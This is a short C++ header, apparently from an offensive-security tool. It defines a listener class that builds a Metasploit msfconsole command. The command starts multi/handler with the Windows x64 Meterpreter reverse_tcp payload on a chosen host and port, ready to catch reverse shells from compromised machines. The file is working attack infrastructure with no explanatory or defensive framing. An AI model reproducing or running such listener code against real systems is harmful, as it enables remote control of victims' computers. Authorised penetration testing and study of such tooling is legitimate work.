#pragma once
#include "InterfaceListener.h"

class Msfconsole : public IListener {
public:
  std::string name() const override { return "msfconsole"; }
  std::string command(const Options &o) const override {
    return "msfconsole -q -x \"use multi/handler; set payload "
           "windows/x64/meterpreter/reverse_tcp; set lhost " +
           o.host + "; set lport " + std::to_string(o.port) + "; exploit\"";
  }
};
